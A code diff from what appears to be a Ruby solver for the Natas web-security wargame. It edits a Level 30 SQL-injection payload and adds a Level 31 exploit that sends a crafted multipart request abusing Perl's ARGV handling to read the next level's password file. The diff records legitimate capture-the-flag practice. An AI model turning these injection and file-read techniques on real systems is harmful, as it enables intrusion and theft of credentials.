@@ -862,7 +862,7 @@ class NatasLevel30 < NatasLevelBase
     ['username', '1 OR 1=1 #'],
     ['username', 2],
     ['password', 'x']
-  ]
+  ].freeze
 
   def exec
     data = post(
@@ -870,7 +870,7 @@ class NatasLevel30 < NatasLevelBase
       {},
       PAYLOAD
     ).body
-    match = %r(<br>natas31(\w{32})<div).match(data)
+    match = /<br>natas31(\w{32})<div/.match(data)
     not_found unless match
     found(match[1])
   end
@@ -879,4 +879,36 @@ end
 # Level 31
 class NatasLevel31 < NatasLevelBase
   LEVEL = 31
+  PAGE = '/'
+  PAYLOAD = %(#{WEBPASS}/natas32)
+
+  def exec
+    payload = URI.encode_www_form_component(PAYLOAD)
+    request = Net::HTTP::Post.new(
+      "#{PAGE}?#{payload}"
+    )
+    request.basic_auth(@login, @password)
+    request['Content-Type'] = 'multipart/form-data; boundary="boundary"'
+    body = <<~BODY
+    --boundary
+    Content-Disposition: form-data; name="file"
+
+    ARGV
+    --boundary
+    Content-Disposition: form-data; name="file"; filename="file"
+
+    --boundary--
+    BODY
+
+    request.body = body.gsub("\n", "\r\n")
+    data = @client.request(request).body
+    match = /<th>(\w{32})\n/.match(data)
+    not_found unless match
+    found(match[1])
+  end
+end
+
+# Level 32
+class NatasLevel32 < NatasLevelBase
+  LEVEL = 32
 end
